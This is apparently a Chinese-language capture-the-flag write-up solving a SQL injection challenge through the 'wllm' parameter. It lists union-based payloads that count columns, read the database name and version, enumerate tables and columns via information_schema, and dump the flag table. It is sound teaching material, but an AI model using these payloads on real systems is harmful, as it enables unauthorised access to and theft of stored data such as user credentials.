![image-20250403165731362](./assets/image-20250403165731362.png)

提示输入内容



查看源码

![image-20250403165753528](./assets/image-20250403165753528.png)



提示参数是wllm

尝试wllm=1

```
?wllm=1
```

![image-20250403165910057](./assets/image-20250403165910057.png)



尝试拼接1'

```
?wllm=1'
```

![image-20250403170146939](./assets/image-20250403170146939.png)

报错



测试回显数

```
?wllm=1' order by 4--+
```

![image-20250403170235182](./assets/image-20250403170235182.png)

```
?wllm=1' order by 3--+
```

![image-20250403170245941](./assets/image-20250403170245941.png)

即三个回显数





测试回显位

```
?wllm=-1' union select 1,2,3 --+
```

![image-20250403170322626](./assets/image-20250403170322626.png)

即第二第三位存在回显





查询当前数据库名及数据库版本信息

```
?wllm=-1' union select 1,database(),version() --+
```

![image-20250403170401724](./assets/image-20250403170401724.png)

数据库名test_db

版本信息MariaDB 10.2.29





查询表名

```
?wllm=-1' union select 1,2,group_concat(table_name) from information_schema.columns where table_schema="test_db"--+
```

![image-20250403171009725](./assets/image-20250403171009725.png)

得到表名：test_tb，users





查询users表中的字段名

```
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="test_db" and table_name="users"--+
```

![image-20250403171037752](./assets/image-20250403171037752.png)

username,password



查询test_tb表中的字段名

```
?wllm=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema="test_db" and table_name="test_tb"--+
```

![image-20250403171403916](./assets/image-20250403171403916.png)

id,flag



查询test_tb表中的字段信息

```
?wllm=-1' union select 1,2,group_concat(id,flag) from test_tb--+
```

![image-20250403171451263](./assets/image-20250403171451263.png)
